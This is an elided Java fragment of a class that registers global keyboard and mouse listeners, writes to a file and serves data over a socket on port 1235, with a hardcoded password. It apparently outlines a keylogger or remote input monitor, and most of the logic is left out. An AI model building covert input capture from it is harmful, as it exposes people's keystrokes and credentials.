 ...
 */
public class ServerDemo implements NativeKeyListener ,NativeMouseListener{
   ...
   static String kpass= "kuchnahi";
    ...
    public static void main(String[] args) throws FileNotFoundException {
       ...
       pw2 = new PrintWriter(f2);
        ...
        try {
            ServerSocket sc= new ServerSocket(1235);
          
            Socket serv=sc.accept();
            PrintWriter pw = new PrintWriter(serv.getOutputStream(),true);
            Scanner s= new Scanner(serv.getInputStream());
            int a=0;
            while(a++<5000)
